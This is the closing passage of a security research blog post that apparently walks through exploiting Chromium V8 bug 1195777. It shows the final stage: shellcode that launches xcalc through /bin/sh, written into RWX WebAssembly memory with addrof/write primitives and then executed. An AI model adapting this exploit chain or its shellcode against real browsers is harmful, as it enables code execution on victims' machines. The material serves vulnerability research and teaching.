<span style=color:#66d9ef>let</span> <span style=color:#a6e22e>shellcode</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Uint8Array</span>([
  <span style=color:#ae81ff>0x48</span>, <span style=color:#ae81ff>0xb8</span>, <span style=color:#ae81ff>0x2f</span>, <span style=color:#ae81ff>0x62</span>, <span style=color:#ae81ff>0x69</span>, <span style=color:#ae81ff>0x6e</span>, <span style=color:#ae81ff>0x2f</span>, <span style=color:#ae81ff>0x73</span>, <span style=color:#ae81ff>0x68</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x99</span>, <span style=color:#ae81ff>0x50</span>, <span style=color:#ae81ff>0x54</span>,
  <span style=color:#ae81ff>0x5f</span>, <span style=color:#ae81ff>0x52</span>, <span style=color:#ae81ff>0x66</span>, <span style=color:#ae81ff>0x68</span>, <span style=color:#ae81ff>0x2d</span>, <span style=color:#ae81ff>0x63</span>, <span style=color:#ae81ff>0x54</span>, <span style=color:#ae81ff>0x5e</span>, <span style=color:#ae81ff>0x52</span>, <span style=color:#ae81ff>0xe8</span>, <span style=color:#ae81ff>0x15</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x00</span>,
  <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x44</span>, <span style=color:#ae81ff>0x49</span>, <span style=color:#ae81ff>0x53</span>, <span style=color:#ae81ff>0x50</span>, <span style=color:#ae81ff>0x4c</span>, <span style=color:#ae81ff>0x41</span>, <span style=color:#ae81ff>0x59</span>, <span style=color:#ae81ff>0x3d</span>, <span style=color:#ae81ff>0x27</span>, <span style=color:#ae81ff>0x3a</span>, <span style=color:#ae81ff>0x30</span>, <span style=color:#ae81ff>0x2e</span>,
  <span style=color:#ae81ff>0x30</span>, <span style=color:#ae81ff>0x27</span>, <span style=color:#ae81ff>0x20</span>, <span style=color:#ae81ff>0x78</span>, <span style=color:#ae81ff>0x63</span>, <span style=color:#ae81ff>0x61</span>, <span style=color:#ae81ff>0x6c</span>, <span style=color:#ae81ff>0x63</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x56</span>, <span style=color:#ae81ff>0x57</span>, <span style=color:#ae81ff>0x54</span>, <span style=color:#ae81ff>0x5e</span>,
  <span style=color:#ae81ff>0x6a</span>, <span style=color:#ae81ff>0x3b</span>, <span style=color:#ae81ff>0x58</span>, <span style=color:#ae81ff>0x0f</span>, <span style=color:#ae81ff>0x05</span>
]);

<span style=color:#66d9ef>let</span> <span style=color:#a6e22e>buf</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>ArrayBuffer</span>(<span style=color:#a6e22e>shellcode</span>.<span style=color:#a6e22e>length</span>);
<span style=color:#66d9ef>let</span> <span style=color:#a6e22e>view</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>DataView</span>(<span style=color:#a6e22e>buf</span>);

<span style=color:#a6e22e>write</span>(<span style=color:#a6e22e>addrof</span>(<span style=color:#a6e22e>buf</span>) <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x14</span><span style=color:#a6e22e>n</span>, <span style=color:#a6e22e>rwx</span>);

<span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>let</span> <span style=color:#a6e22e>i</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; <span style=color:#a6e22e>i</span> <span style=color:#f92672>&lt;</span> <span style=color:#a6e22e>shellcode</span>.<span style=color:#a6e22e>length</span>; <span style=color:#a6e22e>i</span><span style=color:#f92672>++</span>)
  <span style=color:#a6e22e>view</span>.<span style=color:#a6e22e>setUint8</span>(<span style=color:#a6e22e>i</span>, <span style=color:#a6e22e>shellcode</span>[<span style=color:#a6e22e>i</span>]);

<span style=color:#a6e22e>instance</span>.<span style=color:#a6e22e>exports</span>.<span style=color:#a6e22e>main</span>();</code></pre></div>
<h2 id=references>References</h2>
<ul>
<li><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1195777">Issue 1195777: Incorrect representation change from Word64 to Word32</a></li>
</ul>
</div>
<footer class=content__footer></footer>
</section>
<footer class=page__footer><p>
</p>
<p>&copy; 2023 Anvbis</p>
<p>Powered by <a href=https://gohugo.io/>hugo</a> and <a href=https://github.com/joeroe/risotto>risotto</a>.</p>
</footer>
</div>
</body>
</html>